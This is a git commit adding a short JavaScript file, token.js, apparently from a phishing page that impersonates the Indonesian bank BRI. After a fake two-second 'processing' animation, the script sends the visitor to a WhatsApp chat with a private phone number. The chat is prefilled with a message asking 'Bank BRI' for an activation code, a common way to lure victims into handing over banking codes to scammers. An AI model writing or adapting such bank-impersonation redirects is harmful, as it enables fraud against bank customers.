c91ab5499424e1202ef7afe5cbfa8e3a91f8d477
gopay882 <gopay882@gmail.com>
2024-09-09 13:32:50 +0700

    Add files via upload

---
+++ token.js
@@ -0,0 +1,7 @@
+function go(){
+ $("#process1").fadeIn();
+setTimeout(function(){  
+location.href='https://api.whatsapp.com/send?phone=6282181249833&text=𝗛𝗮𝗹𝗹𝗼 𝗕𝗮𝗻𝗸 𝗕𝗥𝗜,%0ASaya mau request kode Aktivasi';
+  $("#process1").fadeOut();
+    }, 2000);    
+}     
